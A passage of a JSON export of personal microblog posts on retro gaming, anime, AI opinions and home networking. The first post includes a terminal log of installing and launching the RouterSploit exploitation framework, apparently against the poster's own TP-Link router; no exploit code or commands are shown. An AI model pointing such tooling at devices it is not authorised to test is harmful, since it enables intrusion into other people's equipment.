pynacl>=1.0.1 in c:\\users\\user\\anaconda3\\lib\\site-packages (from paramiko) (1.5.0)\r\nRequirement already satisfied: pyasn1!=0.5.0,>=0.4.8 in c:\\users\\user\\anaconda3\\lib\\site-packages (from pysnmp) (0.4.8)\r\nRequirement already satisfied: cffi>=1.1 in c:\\users\\user\\anaconda3\\lib\\site-packages (from bcrypt>=3.1.3->paramiko) (1.16.0)\r\nRequirement already satisfied: six>=1.4.1 in c:\\users\\user\\anaconda3\\lib\\site-packages (from bcrypt>=3.1.3->paramiko) (1.16.0)\r\nRequirement already satisfied: pycparser in c:\\users\\user\\anaconda3\\lib\\site-packages (from cffi>=1.1->bcrypt>=3.1.3->paramiko) (2.21)\r\nUsing cached pysnmp-7.1.21-py3-none-any.whl (343 kB)\r\nInstalling collected packages: pysnmp\r\nSuccessfully installed pysnmp-7.1.21\r\n\r\n[notice] A new release of pip is available: 24.1.1 -> 25.2\r\n[notice] To update, run: python.exe -m pip install --upgrade pip\r\n\r\n(base) C:\\Users\\User\\routersploit>clear\r\nDer Befehl \"clear\" ist entweder falsch geschrieben oder\r\nkonnte nicht gefunden werden.\r\n\r\n(base) C:\\Users\\User\\routersploit>cd routersploit\r\n\r\n(base) C:\\Users\\User\\routersploit\\routersploit>python rsf.py\r\npython: can't open file 'C:\\\\Users\\\\User\\\\routersploit\\\\routersploit\\\\rsf.py': [Errno 2] No such file or directory\r\n\r\n(base) C:\\Users\\User\\routersploit\\routersploit>cd ..\r\n\r\n(base) C:\\Users\\User\\routersploit>python rsf.py\r\nTraceback (most recent call last):\r\n  File \"C:\\Users\\User\\routersploit\\rsf.py\", line 9, in <module>\r\n    from routersploit.interpreter import RoutersploitInterpreter\r\n  File \"C:\\Users\\User\\routersploit\\routersploit\\interpreter.py\", line 36, in <module>\r\n    import readline\r\nModuleNotFoundError: No module named 'readline'\r\n\r\n(base) C:\\Users\\User\\routersploit>python -m pip install pyreadline3\r\nCollecting pyreadline3\r\n  Downloading pyreadline3-3.5.4-py3-none-any.whl.metadata (4.7 kB)\r\nDownloading pyreadline3-3.5.4-py3-none-any.whl (83 kB)\r\n   ---------------------------------------- 83.2\/83.2 kB 4.6 MB\/s eta 0:00:00\r\nInstalling collected packages: pyreadline3\r\nSuccessfully installed pyreadline3-3.5.4\r\n\r\n[notice] A new release of pip is available: 24.1.1 -> 25.2\r\n[notice] To update, run: python.exe -m pip install --upgrade pip\r\n\r\n(base) C:\\Users\\User\\routersploit>python rsf.py\r\n ______            _            _____       _       _ _\r\n | ___ \\          | |          \/  ___|     | |     (_) |\r\n | |_\/ \/___  _   _| |_ ___ _ __\\ `--. _ __ | | ___  _| |_\r\n |    \/\/ _ \\| | | | __\/ _ \\ '__|`--. \\ '_ \\| |\/ _ \\| | __|\r\n | |\\ \\ (_) | |_| | ||  __\/ |  \/\\__\/ \/ |_) | | (_) | | |_\r\n \\_| \\_\\___\/ \\__,_|\\__\\___|_|  \\____\/| .__\/|_|\\___\/|_|\\__|\r\n                                     | |\r\n       Exploitation Framework for    |_|    by Threat9\r\n            Embedded Devices\r\n\r\n Codename   : I Knew You Were Trouble\r\n Version    : 3.4.7\r\n Homepage   : https:\/\/www.threat9.com - @threatnine\r\n\r\n Exploits: 143 Scanners: 4 Creds: 171 Generic: 4 Payloads: 32 Encoders: 6\r\n\r\nrsf >\r\n\r\nhttps:\/\/github.com\/threat9\/routersploit\/tree\/master\r\n\ud809\udc2b\r\n\r\nAnaconda @ C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Anaconda3 (64-bit)\\Anaconda Prompt.lnk\r\n\r\nAnd since I suck at whatever <a target=\"_blank\" href=\"https:\/\/github.com\/vpaeder\/tplink_m7350_cpp\">this<\/a> is, let's use the crowbar :PopClutz: \r\n\r\nhttps:\/\/ibb.co\/N2SrSktn\r\nhttps:\/\/i.ibb.co\/HTdCdMBp\/Screenshot-2025-08-23-11-59-14.jpg\r\n\r\n#repost \u2022acws #acws",
            "hashtags": "saturday, TPLink, repost, acws"
        }
    },
    {
        "20250823": {
            "value": "EZ-Flash AIR f\u00fcr #GBA Review https:\/\/m.youtube.com\/watch?v=1LwnwKD3svA\r\n\r\nCard with DS-GBA link support in 2025 ?\r\nWow !\r\n\r\n#EZFlash #flashcard\r\n\r\nPretty cumbersome, as you have to write to #NOR b4 starting a game.\r\nAnd you can only delete ALL games from NOR or the last one\r\nUhf\r\n\r\n\ud809\udc2bOh GBAlink.\r\nBei Battlenetwork 5 konnte der Ordner vom GBA zum DS als locked folder kopiert werden.\r\n\r\nPokemon nat\u00fcrlich klar.\r\n\r\nSchick.\r\nDas EZflash immer noch existiert.\r\nWar 2002 meine erste Karte mit dem komischen blauen USB Flasher.\r\n\r\n.gba.ds war did Fiebertraumhafteste Fileext die es je gab.\r\n\r\nObs f\u00fcr die Flash Air wohl nen DLDI gibt ?\r\n\r\nWow.\r\nDas Filehandling ist grauenhaft.\r\nDa war ein DS mit EZ3in1 ja noch besser.\r\nPuh\r\n\r\nUnd das EZ Team es einfach *nicht* gebacken kriegt Umlaute \u00e1 \"\u00e9\" richtig zu rendern. Peinlich\r\n\r\nIch denk ne EZOmega, ein (M3CF o.\u00e4.) oder sogar nen <a target=\"_blank\" href=\"https:\/\/wiki.gbatemp.net\/wiki\/3_in_1_Expansion_Pack_for_EZ-Flash_V#Software\" style=color:blue>3in1<\/a> mit <a target=\"_blank\" href=\"http:\/\/ezflash.sosuke.com\/about5006.html\" style=color:blue>3 in 1 ExpPack Loader<\/a> <del><a target=\"_blank\" href=\"https:\/\/archive.org\/details\/gba-backup-tool\" style=color:blue>Rudophs tool<\/a><\/del>  (DS) sind die bessere Wahl.\r\n\r\nSo wies aussieht bewegen wir uns r\u00fcckw\u00e4rts \ud83d\ude39\ud809\udc2b",
            "hashtags": "GBA, EZFlash, flashcard, NOR, Software"
        }
    },
    {
        "20250823": {
            "value": "\ud809\udc2b\"Einst haben die Menschen das Denken den Maschinen \u00fcbertragen, in der Hoffnung, dass das sie befreien w\u00fcrde. Doch stattdessen erm\u00f6glichte es nur anderen Menschen mit Maschinen, sie zu versklaven.\"\r\n-Frank Herbert, Dune\ud809\udc2b\r\n#AI #KI",
            "hashtags": "AI, KI"
        }
    },
    {
        "20250823": {
            "value": "#KamikazeKaitouJeanne ref in a #Vendingmachine #isekai #anime\r\nhttps:\/\/m.youtube.com\/watch?v=7q6LpmNT-Dw&t=110s\r\n\r\nuwhaaat :ablobjoy: ",
            "hashtags": "KamikazeKaitouJeanne, Vendingmachine, isekai, anime"
        }
    },
    {
        "20250823": {
            "value": "Real #voices imstead of #ki \/ #ai\r\nhttps:\/\/m.youtube.com\/watch?v=_JlP_jIScSA&t=7m11s\r\n\r\n#petition",
            "hashtags": "voices, ki, ai, petition"
        }
    },
    {
        "20250823": {
            "value": "Great.\r\n#Google decided my \"#Youtube account had suspicious activity\"\r\n\r\nMeaning ?\r\nI must change my password.\r\nCan I just reuse th old one ?\r\nNo. They know. It.\r\n\r\nDone.\r\nI'm done with their nonsense\r\n\r\n[\u00d7] [-] [-]\r\n\r\nThat makes one account I'll nolonger use.\r\n\r\nGood job.\r\nI'm getting sick and tired of the #internet.\r\nPatronizng me.\r\n\r\nOh and some weirdo haxor tried to get into my #GoogleDrive too.\r\nMeaning I cannot use that easily anymore either (even invalidated my oauth that had been active with #CarrotDAV for 10(!) years.\r\nWill I make new one ? No\r\nAre there important files on there ? No\r\n\r\nGood thing I'm selfsufficient enough and can #pay for my used services\r\n\r\n#DontBeTheProduct\r\n\r\nI wonder how people feel who pay google for their \"\"\"\" services\"\"\"\"\r\n\r\n:aqua_aaa: \r\n#repost \u2022acws #acws",
            "hashtags": "Google, Youtube, internet, GoogleDrive, CarrotDAV, pay, DontBeTheProduct, repost, acws"
        }
    },
    {
        "20250822": {
            "value": "~Automatic~\r\n#KamikazeKaitouJeanne\r\nhttps:\/\/www.pixiv.net\/artworks\/134216420\r\nhttps:\/\/poipiku.com\/11331041\/12116877.html\r\n#DoodlesAlcea",
            "hashtags": "KamikazeKaitouJeanne, DoodlesAlcea"
        }
    },
    {
        "20250822": {
            "value": ":KkjMaronWink:\r\n\r\n#repost \u2022acws #acws",
            "hashtags": "repost, acws"
        }
    },
    {
        "20250822": {
            "value": "Mhmm :RedCrystalHeart: \r\n\r\n#KamikazeKaitouJeanne #AMV\r\n\r\n#FavsAlcea\r\n\r\nhttps:\/\/m.youtube.com\/watch?v=leM6sgijub8&pp=ygU2MDcgS2FyZSB3YSBJdHRhaSBOYW5pbW9ubyA_IEthbWlrYXplIEthaXRvdSBKZWFubmUgT1NU\r\n#repost \u2022acws #acws",
            "hashtags": "KamikazeKaitouJeanne, AMV, FavsAlcea, repost, acws"
        }
    },
    {
        "20250822": {
            "value": "A #music #map ?\r\nhttps:\/\/music-map-main.vercel.app\/\r\n\r\nColor me #interested\r\n#repost \u2022acws #acws",
            "hashtags": "music, map, interested, repost, acws"
        }
    },
    {
        "20250822": {
            "value": "\ud809\udc2bI'm full stack web developer in a large company and I have many years of experience. Since when Gemini 2.5 got better (like 4-5 months) most of backend tasks I do like this: I copypaste task docs to Gemini, copypaste 5-10 files relevant to the task, chat a bit about a solution, then copypaste a solution into code. In most cases it works on the first try. Yes I check every line of code and sometimes question Gemini decisions but mostly there's not much to discuss, it just works. Ofc I don't tell anybody how I do this. I could write the same code by hand but it would be 5x slower so there's no point. I feel like my brain and \"coding muscle\" are degrading\ud809\udc2b\r\n\r\nYup.#Coding feels odd now.\r\nAltho if you are like me and use super #obscure libraries and frameworks, #AI is still very dum dum\r\n\r\nhttps:\/\/www.reddit.com\/r\/webdev\/comments\/1mw51hq\/ai_makes_me_feel_like_an_impostor\/\r\n#repost \u2022acws #acws",
            "hashtags": "Coding, obscure, AI, repost, acws"
        }
    },
    {
        "20250822": {
            "value": "\ud83d\udcachttps:\/\/alceawis.com\/notice\/AxR6zUsgGNTYwnxPJA#\ud83d\udcac \r\n\r\nThis seems all very #familiar\r\n\ud809\udc2bAll knowing lifeform that does not make #mistakes\ud809\udc2b\r\n\r\nOh right. #Orihime from #RyuuseiNoRockman.\r\n2006 called and wants its <a target=\"_blank\" href=\"https:\/\/web.archive.org\/web\/20250822184731\/https:\/\/alceawis.de\/ramu.mp4\" style=color:red>plot<\/a> back.\r\n\r\n*Sigh*\r\n\u2022acws #acws #MegamanStarforce\r\n\r\nhttps:\/\/m.youtube.com\/watch?v=dZJU_Mr6eZI",
            "hashtags": "familiar, mistakes, Orihime, RyuuseiNoRockman, acws, MegamanStarforce"
        }
    },
    {
        "20250822": {
            "value": "When Maggy uploads a anti #LLM video you know its gonna be good\r\n:SylveonCoffeePush:\r\n\r\n(This video is a bit #scary :blobreachsob: )\r\n#ChatGPT #DeepSeek #AI #SamAltman\r\n\r\nhttps:\/\/www.youtube.com\/watch?v=dsDcQmJHwQc\r\n#repost \u2022acws #acws #LarryPage #ElonMusk",
            "hashtags": "LLM, scary, ChatGPT, DeepSeek, AI, SamAltman, repost, acws, LarryPage, ElonMusk"
        }
    },
    {
        "20250822": {
            "value": "Sweet.\r\n<a target=\"_blank\" href=\"https:\/\/codepen.io\/ryedai1\/pen\/LEVaerm\" style=color:blue>Updated<\/a> (<a target=\"_blank\" href=\"https:\/\/codeberg.org\/alceawisteria\/MultiUpload-SFTP-FTP-WEBDAV\" style=color:gray>repo<\/a>) the #php #webdav & #sftp up\/downloader so now it can <a target=\"_blank\" href=\"https:\/\/i.ibb.co\/d4TbCLCm\/Screenshot-20250822-185349-Brave.png\" style=color:blue>accesw<\/a> my #TPLink locally (via Palapa Server)\r\n\r\nas a little bonus I can now easily <a target=\"_blank\" href=\"https:\/\/alcea-wisteria.de\/ytarchive\/list.html\" style=color:blue>sync<\/a> #YTarchive to my #router with on click too\r\n#repost \u2022acws #acws\r\n\r\n#CodeAlcea",
            "hashtags": "php, webdav, sftp, TPLink, YTarchive, router, repost, acws, CodeAlcea"
        }
    },
    {
        "20250822": {
            "value": "\ud809\udc2bMeanwhile, I\u2019m really impressed by Bridgy.Fed, which lets Fediverse and Bluesky users follow each other, and interact with posts. I\u2019m particularly pleased it Bluesky-reposts my Mastodon-reposts from people who are also using it \ud83e\udd17 (as well as making my Mastodon account visible in Bluesky searches, and vice versa.)\r\n\r\nI also like that Bridgy.Fed just introduced a form of \u201cactive choice\u201d to ask users (once, via DM) if they want to enable bridging. It\u2019s essential users retain control over where their posts flow, but a purely manual, non-prompted opt-in mechanism would most likely lead to extremely slow growth.\ud809\udc2b\r\n\r\n#Fediverse #Bluesky #Threads #Twitter #interact\r\nhttps:\/\/www.ianbrown.tech\/2024\/10\/09\/mastodon-and-bluesky-show-interoperability-in-action\/",
            "hashtags": "Fediverse, Bluesky, Threads, Twitter, interact"
        }
    },
    {
        "20250822": {
            "value": "\ud809\udc2bpeople just need to unite and let these companies raising prices die. video game industry wont totally die. but if sony or #nintendo fail who really cares. they are not nice to consumers and arent trying to just be a profitable company that makes games. they are stepping beyond their bounds \ud809\udc2b\r\nhttps:\/\/gbatemp.net\/threads\/sony-announces-ps5-price-increase-in-united-states-starting-tomorrow.674527\/",
            "hashtags": "nintendo"
        }
    },
    {
        "20250821": {
            "value": "Turns out asking #deepseek was a good idea..\r\n\r\n*OpenWRT + #SIM router + #PHP relay is pointless.\r\n\r\n<b>Using #ngrok and accessing a #android device on my #network is the way to go.<\/b>\r\n\r\n(You cannot #portforward a sim router as it has a shared #private #IPAdress )\r\nhttps:\/\/ibb.co\/Tqh3X6ZK\r\nhttps:\/\/i.ibb.co\/S7vCTb2Q\/joined-image.png\r\n\r\n#LearnedSomethingAgain ! #NetworkingWithCea\r\n#repost \u2022acws #acws\r\n\r\n\u00bb Ref <a target=\"_blank\" href=\"https:\/\/alceawis.de\/other\/Computerstuff\/Documentation\/2025-08-21-ngrok-serve-anderoid2web.zip\" style=color:blue>2025-08-21-ngrok-serve-anderoid2web<\/a>",
            "hashtags": "deepseek, SIM, PHP, ngrok, android, network, portforward, private, IPAdress, LearnedSomethingAgain, NetworkingWithCea, repost, acws"
        }
    },
    {
        "20250821": {
            "value": "Dr.House and the patient that just wants to talk\r\n#DrHouse\r\nhttps:\/\/m.youtube.com\/watch?v=Xm44-V0siFg",
            "hashtags": "DrHouse"
        }
    },
    {
        "20250821": {
            "value": "#DrHouse\r\nDr. House k\u00fcndigt seinen Job \r\nhttps:\/\/m.youtube.com\/watch?v=0usywgwqTkg",
            "hashtags": "DrHouse"
        }
    },
    {
        "20250821": {
            "value": "#DrHouse Mr.Proper \ud83d\ude43\r\nhttps:\/\/m.youtube.com\/watch?v=qKfXlHvTSzM\r\n\ud809\udc2bYour got that Mr.Proper ?\ud809\udc2b\r\n\r\nThis is legit the best part of the entire show.\r\nWhen Greggy's team left and he hss the #janitor do the part :crazylaugh: ",
            "hashtags": "DrHouse, janitor"
        }
    },
    {
        "20250821": {
            "value": "https:\/\/jauntygoat.net\/about\r\n\r\nSure has some <a href=https:\/\/i.ibb.co\/fVXJHNhC\/Screenshot-20250821-101557-Brave.jpg>rules<\/a> ... :ablobjoy: \r\n\r\nShame its a bit #slow\r\n#mastodon",
            "hashtags": "slow, mastodon"
        }
    }
]